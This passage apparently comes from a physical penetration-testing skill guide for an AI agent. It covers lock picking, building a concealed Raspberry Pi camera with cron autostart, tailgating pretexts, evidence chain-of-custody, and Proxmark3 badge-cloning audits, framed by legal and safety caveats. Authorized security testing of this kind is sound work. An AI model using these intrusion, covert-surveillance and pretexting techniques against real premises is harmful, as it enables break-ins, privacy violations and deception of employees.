Goal: open a commercial pin-tumbler lock (Kwikset, Schlage) using a hook and tension wrench.

```
This is a physical skill — no code. The flow:

1. Apply light tension (bottom of keyway, light clockwise rotation)
2. Insert hook pick at the back of the keyway
3. Rake or single-pin pick:
   - Rake (top of keyway, scrubbing motion): faster, less skill, works on lower belts
   - Single-pin pick (feel each pin, set each to shear line): slower, more reliable
4. Feel for pin clicks; pins "set" with a small click and slight rotation of the core
5. When all pins are at the shear line, the core rotates fully; the lock opens
6. Re-lock from the inside if possible; otherwise pick closed behind you

Equipment:
- Tension wrench (0.025" or 0.018" thickness)
- Hook pick (medium or short hook)
- Rake pick (city rake or bogota)
- Practice locks (transparent, then progressively harder)

Legal: possession of lock picks is regulated in many jurisdictions.
Verify local law before traveling with picks.
```

### Exercise 9: Hidden Camera Placement

Goal: deploy a hidden camera at a choke point for situational awareness during a multi-day engagement.

```bash
# Step 1: Build a Pi Zero W camera (pre-engagement)
# Hardware:
#   - Raspberry Pi Zero W
#   - Pi Camera V2 (or NoIR for low-light)
#   - 5000mAh battery (8-12 hour runtime)
#   - Cellular modem (for off-grid uplink) OR pre-configured WiFi

# Step 2: Software
sudo apt install -y fswebcam
cat > /home/pi/capture.sh <<'EOF'
#!/bin/bash
while true; do
  fswebcam -r 1280x720 --no-banner /home/pi/captures/$(date +%Y%m%d_%H%M%S).jpg
  sleep 60
done
EOF
chmod +x /home/pi/capture.sh

# Auto-start on boot
sudo crontab -e
#   @reboot /home/pi/capture.sh &

# Step 3: Pre-engagement test (24-hour soak)
#   Verify battery life; verify image quality; verify off-site upload

# Step 4: On-site deployment (during engagement)
#   - Place at a choke point: break room, elevator lobby, hallway corner
#   - Conceal: in a plant, on a bookshelf, behind a clock
#   - Document placement (photo) for retrieval at engagement end

# Step 5: Off-site monitoring
#   Cellular uplink: images stream to a cloud bucket
#   Operator reviews feed every 30 minutes for guard rounds

# Step 6: Retrieval
#   Document retrieval; securely wipe the SD card
#   shred -uvz /home/pi/captures/*
```

### Exercise 10: Tailgating Pretext Prep

Goal: prepare a pretext and rehearse the tailgating entry.

```bash
# Step 1: Choose a pretext
#   Options (lowest-risk first):
#   - "I left my badge in my car" + follow an employee through a door
#   - Delivery driver (Amazon/FedEx/food delivery) with a clipboard and box
#   - HVAC / IT contractor with a tool bag (matches observed after-hours contractors)
#   - New employee on first day (matches LinkedIn announcements)
#   - Pizza delivery (classic — most employees will hold the door for pizza)

# Step 2: Match pretext to recon observations
#   - Did you see HVAC vans at the loading dock? HVAC contractor pretext.
#   - Did you see Amazon deliveries? Delivery driver pretext.
#   - Did you observe multiple employees tailgating already? "Badge forgot" pretext.

# Step 3: Wardrobe and props
#   - Match the client's dress code (suit if formal; khakis if casual)
#   - Carry a clipboard with a fake work order (delivery pretext)
#   - Carry a tool bag (contractor pretext)
#   - NO visible lock picks, NO exposed Proxmark3, NO cameras on your person

# Step 4: Pretext script
#   - 15-second greeting (natural; not over-rehearsed)
#   - Plausible reason to enter (delivery, contractor, new employee, forgot badge)
#   - Graceful exit if challenged ("Oh, I'll just go check in at reception")

# Step 5: Rehearse with the engagement team
#   - Roleplay the tailgating scenario with a teammate
#   - Practice what to say if challenged by an employee
#   - Practice what to say if challenged by a guard (produce authorization letter)

# Step 6: Abort criteria
#   - If challenged and pretext fails, leave immediately
#   - If a guard draws or escalates, stop, produce authorization letter, call client contact
#   - NEVER escalate; this is the highest-risk moment in the engagement
```

### Exercise 11: Exit & Evidence Chain-of-Custody

Goal: cleanly reverse the engagement and document evidence with chain-of-custody.

```bash
# Step 1: Reverse all physical changes
#   - Re-lock picked doors (pick closed from the inside, or use a borrowed key)
#   - Return cloned badges to the client (or securely destroy)
#   - Retrieve all hidden cameras and drop boxes
#   - Remove all USB weapons and implants
#   - Reverse any network implants (tear down tunnels, sanitize devices)

# Step 2: Document the timeline
cat > engagement_timeline.md <<EOF
# Engagement Timeline: <CLIENT>, <DATE>

## 08:15 — Pre-engagement recon (walk-by, public property)
## 09:00 — Operator briefing; verify authorization letters
## 09:30 — Tailgating entry via loading dock (operator A)
##         (Pretext: HVAC contractor; guard absent)
## 09:32 — Inside building, headed to target floor
## 09:40 — Drop-box deployed at conference room network jack
##         (LAN Turtle, serial #X; Cloud C2 confirmed online 09:41)
## 09:50 — Badge cloned from unattended desk (HID Prox; T5577 written)
## 10:15 — Server room door entered with cloned badge
## 10:30 — USB weapon deployed at workstation WS-007 (Bash Bunny, beacon live)
## 11:00 — Hidden camera deployed at break room
## 14:00 — Engagement objectives met
## 14:15 — Reversal: USB removed, drop-box retrieved, camera retrieved
## 14:20 — Exit via main entrance (badge tap)
## 14:30 — After-action team debrief
EOF

# Step 3: Evidence pack
mkdir evidence_pack
#   - engagement_timeline.md
#   - cloned_badge_photos/  (before and after for each clone)
#   - drop_box_logs/  (Cloud C2 export, tcpdump capture)
#   - usb_payload_evidence/  (Bash Bunny LED photo, C2 session capture)
#   - hidden_camera_footage/  (no faces of uninvolved employees)
#   - operator_bodycam_footage/  (with consent)

# Step 4: Chain-of-custody form
cat > chain_of_custody.md <<EOF
# Chain of Custody

| Item | Description | Collected | Operator | Storage | Destroyed |
|------|-------------|-----------|----------|---------|-----------|
| 001  | Cloned HID Prox T5577 | 2026-06-17 09:50 | A | encrypted volume | 2026-07-17 |
| 002  | LAN Turtle (retrieved) | 2026-06-17 14:15 | A | evidence safe | n/a (returned to inventory) |
| 003  | Hidden camera SD card | 2026-06-17 14:15 | B | evidence safe | 2026-07-17 |
| 004  | Bash Bunny (retrieved) | 2026-06-17 14:15 | A | evidence safe | n/a |
EOF

# Step 5: Encrypt and deliver
tar -czf evidence_pack.tar.gz evidence_pack/
gpg --symmetric --cipher-algo AES256 evidence_pack.tar.gz
shred -uvz evidence_pack.tar.gz
# Deliver evidence_pack.tar.gz.gpg to the client over an agreed secure channel
```

### Exercise 12: Defensive Badge Audit

Goal: audit a deployed badge system for cloning susceptibility.

```bash
# Step 1: Identify deployed badge technology
# Walk the facility with the client:
#   - Reader make/model (visual)
#   - Card technology (HF vs LF; vendor)
#   - Reader wiring (Wiegand vs OSDP vs RS485)

# Step 2: Test clone susceptibility (with client authorization)
# For each badge technology in use:
pm3
pm3> hf search    # identify HF
pm3> lf search    # identify LF

# HID Prox (LF, no auth): clone in <30 seconds; CRITICAL risk
# Mifare Classic (HF, broken CRYPTO1): clone in <5 minutes; CRITICAL risk
# Mifare DESFire EV2/EV3 (HF, AES-128): clone-resistant; LOW risk
# HID iCLASS legacy (HF, leaked standard keys): clone in <30 minutes; HIGH risk
# HID iCLASS SE / SEOS (HF, mutual auth): clone-resistant; LOW risk

# Step 3: Anti-passback and audit configuration
# - Confirm the access control system logs every badge tap
# - Confirm anti-passback is enforced at every door
# - Run a duplicate-tap report (same badge at two distant doors within impossible time)
# - Run a door-forced-open and door-held-open report; verify guard response SLA

# Step 4: Report
cat > badge_audit_report.md <<EOF
# Badge System Audit: <CLIENT>
## Date: 2026-06-17

## Deployed technology
- LF: HID Prox 125 kHz — CRITICAL cloning risk
- HF: Mifare Classic 1K — CRITICAL cloning risk

## Recommendations
1. Migrate LF (HID Prox) to HID iCLASS SEOS in Q3 2026
2. Migrate HF (Mifare Classic) to Mifare DESFire EV3 in Q3 2026
3. Enable anti-passback at all exterior doors immediately
4. Subscribe to duplicate-tap alerting
5. Quarterly badge audit; annual external physical pentest
EOF
```

## Safety Notes

- **Lawful authorization is non-negotiable**: Physical pentest without a signed scope, ROE, and authorization letter is burglary. Carry the authorization letter on every operator at all times.
- **Get-out-of-jail card is not a magic shield**: The authorization letter is a defense if accused; it does not immunize against arrest. The client must be reachable 24/7 to confirm the engagement.
- **Local law on lock picks varies widely**: Possession of lock picks is criminal in California (Penal Code 466), Nevada, Japan, and parts of the UK without a locksmith credential. Verify before traveling.
- **Audio and video recording has consent requirements**: One-party vs two-party consent states (US) and similar laws in other jurisdictions. Verify with counsel before recording.
- **Prohibited actions are non-negotiable**: No breaking glass, no picking emergency exit locks (function), no decoy devices left behind, no engagement against minors, no entry into third-party colocation cages without that third party's authorization.
- **Abort criteria**: If a guard draws a weapon, stop all activity, produce the authorization letter, call the client contact. Do not run.
- **Evidence minimization**: Don't capture faces of uninvolved employees in hidden camera footage. Don't store credentials longer than the contracted retention period. Don't exfiltrate more data than the engagement requires.
- **Post-engagement retrieval**: Reverse every change. A missed drop-box becomes a criminal device on a client's network. A missed USB weapon becomes evidence of an unauthorized device. Reversal is part of the engagement scope, not optional.

## Hacker Laws

- **Information Wants to Be Free** — A badge credential on the wire is already free; cloning just makes it portable. Defense cannot recall a cloned badge; it can only detect duplicate taps and migrate to mutual-authentication credentials.
- **Obscurity Is Not Security** — A Medeco lock is obscure to most attackers, but not to a trained lock picker. A badge reader hidden behind a plant is still visible to a determined operator. Defense through obscurity fails against skilled operators; defense through layered controls (badge + anti-passback + camera + guard + CPTED) is what works.
- **Trust but Verify** — A client's claim that "we use HID iCLASS SE, not Prox" must be verified by walking the building and reading a card. A vendor's claim that "our lock is pick-resistant" must be tested by picking it. Every assumption about a deployed control must be validated.
- **Weakest Link Is Human** — Most physical breaches involve a human: a tailgated employee, a polite receptionist, an after-hours cleaner who doesn't challenge. Locks and badges rarely fail; people regularly do. Training is the actual control.
- **Divergent Thinking First** — Most engagement planners fixate on the front door. Operators who walk around the building find the loading dock, the smoking area, the roof access, the side door propped for HVAC. The entry vector is rarely the obvious one.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/physical-security-testing-playbook.md` — end-to-end on-site engagement workflow with entry-vector decision matrix, guard interaction rules, and evidence chain-of-custody
- **Related skills**:
  - `skills/bluetooth-rfid-nfc/SKILL.md` — BLE/RFID/NFC radio protocol analysis; the protocol layer beneath this skill's cloning operations
  - `skills/hardware-security/SKILL.md` — JTAG/UART/SPI/I2C and firmware extraction; this skill is the perimeter that protects those devices
  - `skills/sdr-rf-attack/SKILL.md` — broad RF replay (garage doors, keyfobs, alarms); this skill covers badge and gate replay as on-site operations
  - `skills/social-engineering/SKILL.md` — human manipulation; this skill includes physical tailgating pretext as one of five entry vectors
  - `skills/post-exploitation/SKILL.md` — internal network pivoting after drop-box deployment
  - `skills/anti-forensics/SKILL.md` — minimizing footprint and reversing engagement artifacts
- **External resources**:
  - TrustedSec physical-docs (legal templates): [github.com/trustedsec/physical-docs](https://github.com/trustedsec/physical-docs)
  - awesome-lockpicking: [github.com/meitar/awesome-lockpicking](https://github.com/meitar/awesome-lockpicking)
  - RedTeam-Physical-Tools: [github.com/.../RedTeam-Physical-Tools](https://github.com/topics/redteam-physical)
  - ESP-RFID-Tool: [github.com/.../ESP-RFID-Tool](https://github.com/topics/esp-rfid-tool)
  - TeamWalrus/Walrus: [github.com/TeamWalrus/Walrus](https://github.com/TeamWalrus/Walrus)
  - Proxmark3: [github.com/RfidResearchGroup/proxmark3](https://github.com/RfidResearchGroup/proxmark3)
  - Hak5 (LAN Turtle, Packet Squirrel, Rubber Ducky, Bash Bunny): [hak5.org](https://hak5.org)
  - Schuyler Towne (locksport educator): [youtube.com/@SchuylerTowne](https://www.youtube.com/@SchuylerTowne)
  - DEF CON Physical Security Village: [defcon.org](https://defcon.org)
  - TOOOL (The Open Organisation Of Lockpickers): [toool.us](https://toool.us)
  - CPTED (Crime Prevention Through Environmental Design): [cpted.net](https://www.cpted.net)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
